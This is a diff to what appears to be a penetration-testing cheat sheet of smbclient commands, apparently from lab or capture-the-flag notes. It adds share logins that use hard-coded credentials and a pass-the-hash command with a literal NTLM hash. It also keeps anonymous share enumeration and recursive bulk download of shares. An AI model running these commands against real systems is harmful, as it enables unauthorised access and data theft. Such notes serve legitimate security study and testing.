@@ -194,9 +194,17 @@ smbclient -N -L \\\\{TARGET_IP}\\
 # -L : This option allows you to look at what services are available on a server
 
 
+
+smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
+
+
 smbclient \\\\$ip\\C$
 smbclient \\\\$ip\\CustomShare
 smbclient //[IP]/Public -N
+
+
+
+
 
 # Access share 
 smbclient \\\\[IP]\\sharename -U [USERNAME]
@@ -209,6 +217,7 @@ smbclient //[IP]/admin -U admin
 smbclient -U [USERNAME]%[PASSWORD] //[IP]/Users
 smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //10.10.10.100/Users
 
+smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
 
 # list shares
 smbclient - L //[IP] -U [USERNAME]
@@ -218,6 +227,10 @@ smbclient - L //[IP] -U [USERNAME]
 smbclient //10.10.11.222/[SHARE NAME] -N -c 'prompt OFF;recurse ON;lcd '[DESTINATION PATH]';mget *'
 
 
+# Pass the Hash
+smbclient \\\\[TARGET IP]\\[SHARE] -U Administrator --pw-nt-hash [NTLM HASH]
+
+smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 
 ```
 
